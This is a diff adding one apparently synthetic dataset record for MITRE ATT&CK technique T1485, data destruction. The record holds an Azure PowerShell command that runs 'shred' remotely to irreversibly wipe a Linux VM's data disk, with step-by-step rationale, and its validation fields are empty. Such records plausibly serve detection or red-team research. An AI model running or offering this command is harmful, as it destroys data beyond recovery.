@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Archive' -Name 'LinVM-Archive' -CommandId 'RunShellScript' -ScriptString \"shred -v -n 3 -z /dev/sdc\"",
+  "explanation": "Overwrites the entire data disk /dev/sdc on a Linux VM with multiple passes, destroying all data on that targeted disk.",
+  "rationale_steps": [
+    "Identify the specific attached data disk (/dev/sdc) used for archives.",
+    "Overwrite the block device with multiple passes and a final zero pass to prevent recovery."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-19276e27",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
